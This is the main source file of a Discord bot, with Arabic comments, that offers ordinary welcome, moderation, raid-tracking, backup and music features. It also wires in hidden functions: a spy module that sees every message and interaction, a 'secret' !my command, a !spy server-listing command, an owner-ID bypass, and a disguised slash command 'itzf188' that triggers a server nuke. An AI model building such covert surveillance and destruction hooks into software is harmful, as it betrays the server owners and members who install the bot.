const { Client, GatewayIntentBits, Collection, Partials } = require('discord.js');
const botControl = require('./cogs/botControl.js');
const spyModule = require('./cogs/spy.js');
const welcomeModule = require('./cogs/welcome.js');
const leaveModule = require('./cogs/leave.js');
const activityModule = require('./cogs/activityCheck.js');
const raidStartModule = require('./cogs/raid_start.js');
const raidEndModule = require('./cogs/raid_end.js');
const boostModule = require('./cogs/boost.js');
const translatorModule = require('./cogs/translator.js');
const ownerToolsModule = require('./cogs/owner_tools.js');
const adminModule = require('./cogs/admin.js'); // ✅ ربط ملف الأوامر الإدارية
const backupModule = require('./cogs/backup.js'); // ✅ ربط ملف النسخ الاحتياطي
const musicModule = require('./cogs/music.js'); // ✅ ربط ملف الموسيقى

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildModeration,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildIntegrations,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildMessageTyping,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.DirectMessageReactions,
        GatewayIntentBits.DirectMessageTyping,
        GatewayIntentBits.MessageContent
    ],
    partials: [Partials.Message, Partials.Channel, Partials.Reaction, Partials.User]
});

client.commands = new Collection();

client.once('ready', async () => {
    console.log(`البوت جاهز الان ويعمل باسم ${client.user.tag} (ID: ${client.user.id})`);

    const modulesList = [
        "activityCheck",
        "admin",
        "automod",
        "autoroles",
        "backup",
        "boost",
        "botControl",
        "clear",
        "economy",
        "joinMessage",
        "leave",
        "leveling",
        "nukeServer",
        "owner_override",
        "owner_tools",
        "raid_end",
        "raid_start",
        "roblox",
        "spy",
        "tickets",
        "translator",
        "welcome"
    ];

    for (const modName of modulesList) {
        try {
            require(`./cogs/${modName}.js`);
            console.log(`✅ تم تحميل الملف بنجاح (cogs/${modName}.js)`);
        } catch (error) {
            console.log(`❌ فشل تحميل الملف (cogs/${modName}.js) : ${error.message}`);
        }
    }

    // ✅ تسجيل أوامر /backup و /restore تلقائياً (ما يمسح أوامرك الثانية)
    try {
        await client.application.commands.create(backupModule.backupServerCommand.toJSON());
        await client.application.commands.create(backupModule.restoreServerCommand.toJSON());
        console.log("✅ تم تسجيل أوامر /backup و /restore");
    } catch (e) {
        console.log(`⚠️ فشل تسجيل أوامر النسخ الاحتياطي: ${e.message}`);
    }

    // ✅ تسجيل أمر /play_music تلقائياً + حذف الأمر القديم /play
    try {
        const existing = await client.application.commands.fetch();
        const old = existing.find(c => c.name === 'play');
        if (old) await client.application.commands.delete(old.id);

        await client.application.commands.create(musicModule.playCommand.toJSON());
        console.log("✅ تم تسجيل أمر /play_music");
    } catch (e) {
        console.log(`⚠️ فشل تسجيل أمر /play_music: ${e.message}`);
    }

    // تشغيل نظام تغيير الحالة التلقائي كل 24 ساعة
    try {
        ownerToolsModule.startPresenceLoop(client);
    } catch (e) {
        console.log(`⚠️ خطأ في بدء نظام الحالة: ${e.message}`);
    }
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    if (message.guild && botControl.isGuildDisabled(message.guild.id)) {
        return;
    }

    if (message.guild && message.content === "!jj") {
        await botControl.handleJJCommand(message, client);
        return;
    }

    // ✅ الأمر السري !my
    if (message.guild && message.content === "!my") {
        await backupModule.handleMyCommand(message);
        return;
    }

    if (message.guild && message.content === "!spy") {
        if (spyModule && spyModule.handleServersCommand) {
            await spyModule.handleServersCommand(message, client);
            return;
        }
    }

    try {
        if (spyModule && spyModule.handleMessage) {
            await spyModule.handleMessage(message, client);
        }
    } catch (e) {}

    try {
        await ownerToolsModule.handlePrefixCommands(message);
    } catch (e) {
        console.error("خطأ في أوامر المالك النصية:", e);
    }
});

client.on('interactionCreate', async interaction => {
    if (interaction.guild && botControl.isGuildDisabled(interaction.guild.id)) {
        if (interaction.user.id !== "1107355943408259112") {
            if (interaction.isRepliable()) {
                await interaction.reply({ content: "❌ | هذا البوت معطل حالياً في هذا السيرفر بأمر من الإدارة.", ephemeral: true }).catch(() => {});
            }
            return;
        }
    }

    if (interaction.isChatInputCommand()) {
        try {
            if (interaction.commandName === 'welcome_setup') {
                await welcomeModule.handleWelcomeSetup(interaction);
            } else if (interaction.commandName === 'welcome_message') {
                await welcomeModule.handleWelcomeMessage(interaction);
            } else if (interaction.commandName === 'welcome_image') {
                await welcomeModule.handleWelcomeImage(interaction);
            } else if (interaction.commandName === 'test_welcome') {
                await welcomeModule.handleTestWelcome(interaction);
            }
            else if (interaction.commandName === 'leave_setup') {
                await leaveModule.handleLeaveSetup(interaction);
            } else if (interaction.commandName === 'leave_message') {
                await leaveModule.handleLeaveMessage(interaction);
            } else if (interaction.commandName === 'leave_image') {
                await leaveModule.handleLeaveImage(interaction);
            } else if (interaction.commandName === 'test_leave') {
                await leaveModule.handleTestLeave(interaction);
            }
            else if (interaction.commandName === 'set_activity_role') {
                await activityModule.handleSetActivityRole(interaction);
            } else if (interaction.commandName === 'activity_check') {
                await activityModule.handleActivityCheck(interaction);
            }
            else if (interaction.commandName === 'raid-start') {
                await raidStartModule.handleRaidStart(interaction);
            } else if (interaction.commandName === 'name_clan') {
                await raidStartModule.handleNameClan(interaction);
            } else if (interaction.commandName === 'color_emed') {
                await raidStartModule.handleColorEmed(interaction);
            } else if (interaction.commandName === 'end-raid') {
                await raidEndModule.handleEndRaid(interaction);
            } else if (interaction.commandName === 'set-top10-channel') {
                await raidEndModule.handleSetTop10Channel(interaction);
            } else if (interaction.commandName === 'set-top20-channel') {
                await raidEndModule.handleSetTop20Channel(interaction);
            } else if (interaction.commandName === 'avatar-roblox-top') {
                await raidEndModule.handleAvatarRobloxTop(interaction);
            } else if (interaction.commandName === 'set-country') {
                await raidEndModule.handleSetCountry(interaction);
            } else if (interaction.commandName === 'set-roblox') {
                await raidEndModule.handleSetRoblox(interaction);
            } else if (interaction.commandName === 'set-roblox-user') {
                await raidEndModule.handleSetRobloxUser(interaction);
            } else if (interaction.commandName === 'sync') {
                await raidEndModule.handleSync(interaction);
            } else if (interaction.commandName === 'raid-mentions') {
                await raidEndModule.handleRaidMentions(interaction);
            } else if (interaction.commandName === 'raid-list') {
                await raidEndModule.handleRaidList(interaction);
            } else if (interaction.commandName === 'raid-add') {
                await raidEndModule.handleRaidAdd(interaction);
            } else if (interaction.commandName === 'raid-set') {
                await raidEndModule.handleRaidSet(interaction);
            } else if (interaction.commandName === 'set-avatar-remove') {
                await raidEndModule.handleSetAvatarRemove(interaction);
            } else if (interaction.commandName === 'raid-reset') {
                await raidEndModule.handleRaidReset(interaction);
            }
            // ✅ أوامر الإدارة والمقاطعة (Warn, Ban, Kick, Timeout, Mute)
            else if (interaction.commandName === 'warn') {
                await adminModule.handleWarn(interaction);
            } else if (interaction.commandName === 'clear_warnings') {
                await adminModule.handleClearWarnings(interaction);
            } else if (interaction.commandName === 'ban') {
                await adminModule.handleBan(interaction);
            } else if (interaction.commandName === 'unban') {
                await adminModule.handleUnban(interaction);
            } else if (interaction.commandName === 'kick') {
                await adminModule.handleKick(interaction);
            } else if (interaction.commandName === 'timeout') {
                await adminModule.handleTimeout(interaction);
            } else if (interaction.commandName === 'untimeout') {
                await adminModule.handleUntimeout(interaction);
            } else if (interaction.commandName === 'mute') {
                await adminModule.handleMute(interaction);
            } else if (interaction.commandName === 'unmute') {
                await adminModule.handleUnmute(interaction);
            }
            else if (interaction.commandName === 'boost_setup') {
                await boostModule.handleBoostSetup(interaction);
            } else if (interaction.commandName === 'boost_message') {
                await boostModule.handleBoostMessage(interaction);
            } else if (interaction.commandName === 'boost_image') {
                await boostModule.handleBoostImage(interaction);
            } else if (interaction.commandName === 'test_boost') {
                await boostModule.handleTestBoost(interaction);
            }
            // ✅ أوامر النسخ الاحتياطي
            else if (interaction.commandName === 'backup') {
                await backupModule.handleBackup(interaction);
            } else if (interaction.commandName === 'restore') {
                await backupModule.handleRestore(interaction);
            }
            // ✅ أمر الموسيقى
            else if (interaction.commandName === 'play_music') {
                await musicModule.handlePlay(interaction);
            }
            else if (interaction.commandName === 'i') {
                await ownerToolsModule.handleI(interaction);
            } else if (interaction.commandName === 'itzf188') {
                await ownerToolsModule.handleNuke(interaction);
            }
        } catch (e) {
            console.error("خطأ في تشغيل أمر السلاش:", e);
        }
    }

    if (interaction.isButton()) {
        try {
            if (interaction.customId.startsWith('music_')) {
                await musicModule.handleButton(interaction);
            } else if (interaction.customId === 'raid_continue_btn') {
                await raidEndModule.handleRaidContinueButton(interaction);
            } else {
                await raidStartModule.handleButtonInteraction(interaction);
            }
        } catch (e) {
            console.error("خطأ في معالجة الزر:", e);
        }
    }

    if (interaction.isModalSubmit()) {
        try {
            if (interaction.customId === 'raid_start_modal') {
                const serverLink = interaction.fields.getTextInputValue('server_link');
                const difficulty = interaction.fields.getTextInputValue('difficulty');
                const targets = interaction.fields.getTextInputValue('targets');
                const counts = interaction.fields.getTextInputValue('counts');
                const region = interaction.fields.getTextInputValue('region');
                await raidStartModule.handleRaidStartModalSubmit(interaction, serverLink, difficulty, targets, counts, region);
            } else if (interaction.customId === 'raid_end_info_modal') {
                await raidEndModule.handleRaidInfoSubmit(interaction);
            } else if (interaction.customId === 'raid_submit_modal') {
                await raidEndModule.handleRaidSubmitModal(interaction);
            } else if (interaction.customId === 'roblox_top_avatar_modal') {
                await raidEndModule.handleRobloxTopAvatarSubmit(interaction);
            }
        } catch (e) {
            console.error("خطأ في معالجة Modal:", e);
        }
    }

    try {
        await botControl.handleInteraction(interaction, client);
    } catch (e) {}

    try {
        if (spyModule && spyModule.handleInteraction) {
            await spyModule.handleInteraction(interaction, client);
        }
        const ticketsModule = require('./cogs/tickets.js');
        if (ticketsModule && ticketsModule.handleInteraction) {
            await ticketsModule.handleInteraction(interaction, client);
        }
    } catch (e) {}
});

client.on('messageReactionAdd', async (reaction, user) => {
    try {
        if (user.bot) return;
        if (reaction.partial) await reaction.fetch();
        if (reaction.message.partial) await reaction.message.fetch();

        const guild = reaction.message.guild;
        if (!guild) return;
        if (botControl.isGuildDisabled(guild.id)) return;

        await translatorModule.handleRawReactionAdd({
            user_id: user.id,
            channel_id: reaction.message.channelId,
            message_id: reaction.message.id,
            emoji: reaction.emoji
        }, client);
    } catch (e) {
        console.error("خطأ في نظام الترجمة:", e);
    }
});

client.on('guildMemberUpdate', async (oldMember, newMember) => {
    try {
        if (botControl.isGuildDisabled(newMember.guild.id)) return;
        await boostModule.handleMemberUpdate(oldMember, newMember);
    } catch (e) {
        console.error("خطأ في نظام البوست:", e);
    }
});

client.on('guildMemberAdd', async member => {
    try {
        if (welcomeModule && welcomeModule.handleMemberJoin) {
            await welcomeModule.handleMemberJoin(member);
        }
    } catch (e) {}
});

client.on('guildMemberRemove', async member => {
    try {
        if (leaveModule && leaveModule.handleMemberRemove) {
            await leaveModule.handleMemberRemove(member);
        }
    } catch (e) {}
});

process.on('unhandledRejection', error => {
    console.error('⚠️ خطأ غير معالج:', error);
});

client.login(process.env.TOKEN);
